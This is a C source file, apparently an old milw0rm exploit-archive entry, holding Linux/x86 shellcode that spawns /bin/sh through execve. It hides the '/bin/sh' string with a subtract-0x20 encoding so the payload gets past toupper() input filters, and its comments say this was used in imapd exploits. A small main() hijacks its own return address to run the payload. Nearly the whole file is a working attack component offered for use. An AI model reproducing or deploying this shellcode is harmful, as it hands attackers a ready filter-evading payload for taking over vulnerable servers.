/*
 *  Linux/x86
 *
 *  toupper() evasion, standard execve() /bin/sh (used eg. in various
 *  imapd exploits). Goes through a loop adding 0x20 to the
 *  (/bin/sh -= 0x20) string (ie. yields /bin/sh after addition).
 */
#include <stdio.h>

char c0de[] =
/* main: */
"\xeb\x29"                            /* jmp callz                   */
/* start: */
"\x5e"                                /* popl %esi                   */
"\x29\xc9"                            /* subl %ecx, %ecx             */
"\x89\xf3"                            /* movl %esi, %ebx             */
"\x89\x5e\x08"                        /* movl %ebx, 0x08(%esi)       */
"\xb1\x07"                            /* movb $0x07, %cl             */
/* loopz: */
"\x80\x03\x20"                        /* addb $0x20, (%ebx)          */
"\x43"                                /* incl %ebx                   */
"\xe0\xfa"                            /* loopne loopz                */
"\x29\xc0"                            /* subl %eax, %eax             */
"\x88\x46\x07"                        /* movb %al, 0x07(%esi)        */
"\x89\x46\x0c"                        /* movl %eax, 0x0c(%esi)       */
"\xb0\x0b"                            /* movb $0x0b, %al             */
"\x87\xf3"                            /* xchgl %esi, %ebx            */
"\x8d\x4b\x08"                        /* leal 0x08(%ebx), %ecx       */
"\x8d\x53\x0c"                        /* leal 0x0c(%ebx), %edx       */
"\xcd\x80"                            /* int $0x80                   */
"\x29\xc0"                            /* subl %eax, %eax             */
"\x40"                                /* incl %eax                   */
"\xcd\x80"                            /* int $0x80                   */
/* callz: */
"\xe8\xd2\xff\xff\xff"                /* call start                  */
"\x0f\x42\x49\x4e\x0f\x53\x48";       /* /bin/sh -= 0x20             */

main() {
        int *ret;
        ret=(int *)&ret +2;
        printf("Shellcode lenght=%d\n",strlen(c0de));
        (*ret) = (int)c0de;
}

// milw0rm.com [2000-08-08]